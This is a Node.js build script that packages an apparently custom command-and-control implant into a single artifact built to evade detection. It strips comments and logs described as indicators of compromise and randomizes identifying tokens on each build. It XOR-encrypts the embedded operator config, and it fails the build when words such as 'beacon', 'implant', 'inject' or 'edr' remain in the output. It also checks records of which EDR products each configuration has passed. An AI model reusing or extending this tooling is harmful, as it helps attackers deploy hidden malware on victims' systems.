#!/usr/bin/env node
// build_payload.js — bundle src/ into ONE self-contained artifact.
//
// Shipped-artifact hygiene (hard rule — src/ is commented for humans, the
// target only ever sees the transformed bundle):
//   1. comments stripped (all of them)
//   2. log(...) call LINES physically removed (dev logging never ships as
//      string literals — quiet-mode off is not enough, the strings are IoCs)
//   3. telltale tokens renamed per build: __LOIS_BAKED__ global, LOIS_ env
//      prefix, lois.config.json sidecar name
//   4. optional esbuild minify pass (identifier mangling) when a local
//      esbuild binary is available (tools/esbuild or PATH)
//   5. baked config embedded XOR-encrypted with a per-build split key
//      (--enc-strings, default ON for --bake); baked-overridden string
//      DEFAULTS in src/config.js are scrubbed to ''
//   6. win32 shell-out code (tasklist ps) is dead-code-eliminated by default
//      via esbuild define __LW_SHELLOUT__=false; --allow-shellout opts in
//
// test/run_tests.js greps the artifact against a word denylist — a comment or
// marker that escapes these transforms fails the suite.
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const { spawnSync } = require('child_process');

const ROOT = path.join(__dirname, '..');
const SRC = path.join(ROOT, 'src');
const DIST = path.join(ROOT, 'dist');
const ENTRY = 'entry';

const args = process.argv.slice(2);
const arg = (n, d) => { const i = args.indexOf('--' + n); return i >= 0 && args[i + 1] ? args[i + 1] : d; };
const has = (n) => args.includes('--' + n);

// ---- per-build neutral tokens ------------------------------------------------
const FIXED = has('fixed-tokens'); // deterministic tokens for tests/dev loops
const LETTERS = 'ABCDEFGHJKMNPQRSTUVWXYZ'; // env prefixes must start with a letter
const randLetters = (n) => Array.from(crypto.randomBytes(n)).map((b) => LETTERS[b % LETTERS.length]).join('');
const TOK = FIXED ? { baked: '__lwcfg__', envPrefix: 'LW_', sidecar: 'support.json' } : {
  baked: '__' + crypto.randomBytes(3).toString('hex') + '__',   // global cfg hook
  envPrefix: randLetters(4) + '_',                              // env vars (letter-led)
  sidecar: arg('sidecar-name', 'support.json'),                 // config filename
};

// ---- bundler (hand-rolled CJS concat — runtime has ZERO npm deps) -----------
function scan() {
  const mods = {};
  for (const f of fs.readdirSync(SRC)) {
    if (!f.endsWith('.js')) continue;
    mods[path.basename(f, '.js')] = fs.readFileSync(path.join(SRC, f), 'utf8');
  }
  return mods;
}
function depsOf(code) {
  const out = new Set();
  const re = /require\(\s*(['"])\.\/([\w-]+)\1\s*\)/g;
  let m; while ((m = re.exec(code))) out.add(m[2]);
  return [...out];
}
function topoSort(mods, root) {
  const order = [], seen = new Set(), stack = [[root, false]];
  while (stack.length) {
    const [name, done] = stack.pop();
    if (done) { order.push(name); continue; }
    if (seen.has(name)) continue;
    seen.add(name); stack.push([name, true]);
    for (const d of depsOf(mods[name])) {
      if (!mods[d]) throw new Error(`module "${name}" requires missing "./${d}"`);
      if (!seen.has(d)) stack.push([d, false]);
    }
  }
  return order;
}

// ---- hygiene transforms (style rules they rely on are enforced by tests) ----
function hygiene(code) {
  // 1. /* ... */ block comments (none of our sources put them inside strings)
  code = code.replace(/\/\*[\s\S]*?\*\//g, '');
  // 2. comments: full-line, and trailing after whitespace-before-// (our
  //    sources never write ' //' inside a string literal — style rule,
  //    enforced by the hygiene test)
  code = code.replace(/^[ \t]*\/\/[^\n]*$/gm, '');
  code = code.replace(/[ \t]+\/\/[^\n]*$/gm, '');
  // 3. dev log lines: every log(...) call is a single full statement line
  code = code.replace(/^[ \t]*log\([\s\S]*?\);\s*$/gm, '');
  // 3b. dev-only fatal print in the plain-node bootstrap (never the injector path)
  code = code.split("console.error('fatal', e); ").join('');
  // 3c. the log/ts helper definitions (minify does not reliably DCE them
  //     inside the factory closures — remove physically; both agent.js's
  //     QUIET-gated form and nhttp.js's cfg.debug form match this)
  code = code.replace(/^[ \t]*const log = [^\n]*console\.log[^\n]*\n/gm, '');
  code = code.replace(/^[ \t]*const ts = \(\) => new Date\(\)\.toISOString\(\)[^\n]*\n/gm, '');
  // 4. token renames
  code = code.split('__LOIS_BAKED__').join(TOK.baked);
  code = code.split('LOIS_').join(TOK.envPrefix);
  code = code.split('lois.config.json').join(TOK.sidecar);
  code = code.split('LOIS').join('lw'); // remaining brand mentions (log prefix etc.)
  // collapse the blank lines the strips left
  code = code.replace(/\n{3,}/g, '\n\n');
  return code;
}

// ---- ticket 004: scrub DEFAULTS the bake overrides ---------------------------
// Operates only on the DEFAULTS block of src/config.js. Style rules relied on
// (enforced by tests): string defaults are single-quoted, one per line.
function scrubBakedDefaults(configSrc, baked) {
  const start = configSrc.indexOf('const DEFAULTS = {');
  const end = configSrc.indexOf('\n};', start);
  if (start < 0 || end < 0) { console.log('[build] WARN: DEFAULTS block not found — no scrub'); return configSrc; }
  let block = configSrc.slice(start, end);
  for (const k of Object.keys(baked)) {
    if (typeof baked[k] !== 'string') continue;
    const re = new RegExp('(\\n\\s*' + k + '\\s*:\\s*)\'(?:[^\'\\\\]|\\\\.)*\'');
    block = block.replace(re, `$1''`); // absent key -> no-op
  }
  return configSrc.slice(0, start) + block + configSrc.slice(end);
}

function emit(mods, order) {
  const head =
`(function (realRequire, bundleDirname) {
  'use strict';
  const __modules = Object.create(null);
  function __define(name, factory) { __modules[name] = { factory: factory, inst: undefined }; }
  function __require(name) {
    const m = __modules[name];
    if (!m) throw new Error('missing module "' + name + '"');
    if (m.inst === undefined) {
      const module = { exports: {} };
      m.inst = null;
      const localRequire = function (spec) {
        if (spec.charAt(0) === '.') return __require(spec.replace(/^\\.\\/?/, ''));
        return realRequire(spec);
      };
      m.inst = m.factory(localRequire, module, module.exports, bundleDirname) || module.exports;
    }
    return m.inst;
  }
`;
  const parts = [head];
  for (const name of order) {
    const body = hygiene(mods[name].replace(/\r\n/g, '\n'));
    parts.push(`  __define(${JSON.stringify(name)}, function (require, module, exports, __dirname) {\n`);
    parts.push(body);
    parts.push(`\n  });\n`);
  }
  parts.push(`  __require(${JSON.stringify(ENTRY)});\n})(require, __dirname);\n`);
  return parts.join('');
}

function findEsbuild() {
  const cands = [
    path.join(ROOT, '..', 'Adaptix-custom', 'tools', 'esbuild', 'esbuild'),
    '/projects/tools/esbuild/esbuild',
    'esbuild',
  ];
  for (const c of cands) {
    const r = spawnSync(c, ['--version'], { encoding: 'utf8' });
    if (!r.error && r.status === 0) return c;
  }
  return null;
}

// ---- main --------------------------------------------------------------------
(function main() {
  fs.mkdirSync(DIST, { recursive: true });
  const mods = scan();
  const order = topoSort(mods, ENTRY);

  // --bake <config.json>: embed operator config (priority: env > sidecar > baked)
  // --enc-strings (default ON when baking): the baked blob ships XOR-encrypted
  // (split key) instead of as a plaintext JSON literal; overridden sensitive
  // string DEFAULTS in src/config.js are scrubbed to '' so prod IoCs never
  // appear twice (once encrypted in the bake, once plain in the defaults).
  let bakePre = '';
  const bakeIdx = args.indexOf('--bake');
  const encStrings = has('enc-strings') || (!has('no-enc-strings') && bakeIdx >= 0);
  if (bakeIdx >= 0) {
    const f = args[bakeIdx + 1];
    const baked = JSON.parse(fs.readFileSync(f, 'utf8'));
    if (encStrings) {
      const json = JSON.stringify(baked);
      const key = FIXED ? Buffer.alloc(16, 0xa5) : crypto.randomBytes(16);
      const codes = Array.from(json).map((ch, i) => ch.charCodeAt(0) ^ key[i % key.length]);
      bakePre = `globalThis.${TOK.baked}={d:${JSON.stringify(codes)},k1:${JSON.stringify(Array.from(key.slice(0, 8)))},k2:${JSON.stringify(Array.from(key.slice(8)))}};\n`;
      mods.config = scrubBakedDefaults(mods.config, baked);
      console.log('[build] baked config ENCRYPTED (' + json.length + ' chars, split-key XOR) + defaults scrubbed');
    } else {
      bakePre = `globalThis.${TOK.baked} = ${JSON.stringify(baked)};\n`;
      console.log('[build] baked config keys: ' + Object.keys(baked).join(', '));
    }
  }

  let bundle = bakePre + emit(mods, order);
  const plainPath = path.join(DIST, arg('name', 'bundle') + '.js');
  fs.writeFileSync(plainPath, bundle);
  console.log(`[build] plain -> ${plainPath} (${bundle.length} bytes)`);

  let minified = false;
  if (!has('no-min')) {
    const esb = findEsbuild();
    if (esb) {
      // --allow-shellout: compile IN the win32 tasklist path (default builds
      // dead-code-eliminate it — ticket 001; see src/fsops.js psList)
      const defs = `--define:globalThis.__LW_SHELLOUT__=${has('allow-shellout') ? 'true' : 'false'}`;
      const r = spawnSync(esb, ['--minify', '--platform=node', '--target=node18', defs],
        { input: bundle, encoding: 'utf8', maxBuffer: 64 << 20 });
      if (r.status === 0) {
        fs.writeFileSync(plainPath, r.stdout);
        minified = true;
        console.log(`[build] minified (${r.stdout.length} bytes, shellout=${has('allow-shellout') ? 'ON' : 'off'})`);
      } else console.log('[build] esbuild failed, kept plain: ' + r.stderr.slice(0, 200));
    } else {
      console.log('[build] esbuild not found — shipping comment-stripped plain bundle (pass --no-min to silence)');
    }
  }

  // hygiene self-check on the shipped bytes (the <<<PAYLOAD_DATA>>> marker is
  // protocol-required by the stock listener template — exempt it from the scan)
  const shipped = fs.readFileSync(plainPath, 'utf8').replace('<<<PAYLOAD_DATA>>>', '');
  const denied = ['lois', 'beacon', 'adaptix', 'implant', 'inject', 'c2 ', ' edr', 'airlock'];
  // ticket 001: shellout strings may only survive in --allow-shellout builds;
  // the assertion needs the minify pass (dead-code elim) to have run
  if (!has('allow-shellout')) {
    if (minified) denied.push('child_process', 'tasklist', 'net session');
    else if (!has('no-min')) console.log('[build] WARN: unminified fallback — shellout strings not eliminated (dev artifact only)');
  }
  const hits = denied.filter((w) => shipped.toLowerCase().includes(w));
  if (hits.length) {
    console.error('[build] HYGIENE FAIL — denylist words in artifact: ' + hits.join(', '));
    process.exit(1);
  }
  console.log('[build] hygiene check clean');

  // ---- ticket 012: tested-config stamp (informational, never blocks) --------
  // The stamp hashes the EFFECTIVE baked config (key-sorted canonical JSON),
  // not the artifact bytes (tokens/keys randomize per build by design).
  if (bakeIdx >= 0) {
    try {
      const sortDeep = (o) => Array.isArray(o) ? o.map(sortDeep)
        : (o && typeof o === 'object'
            ? Object.fromEntries(Object.keys(o).sort().map((k) => [k, sortDeep(o[k])])) : o);
      const cfgHash = crypto.createHash('sha256')
        .update(JSON.stringify(sortDeep(JSON.parse(fs.readFileSync(args[bakeIdx + 1], 'utf8')))))
        .digest('hex');
      const testedPath = path.join(ROOT, 'tested.json');
      const tested = fs.existsSync(testedPath) ? JSON.parse(fs.readFileSync(testedPath, 'utf8')) : {};
      let stamped = false;
      for (const [edr, rec] of Object.entries(tested)) {
        if (rec.config_sha256 === cfgHash && rec.result === 'pass') {
          console.log(`[tested] ${edr}: PASS ${rec.last_tested} (tester: ${rec.tester}) — config matches`);
          stamped = true;
        }
      }
      if (!stamped)
        console.log('[tested] !! UNTESTED build shape — no passing record matches this config. Run the gate before deploying.');
    } catch (e) { console.log('[tested] stamp check failed (non-fatal): ' + e.message); }
  } else {
    console.log('[tested] unbaked build — dev only, not deployable');
  }
})();
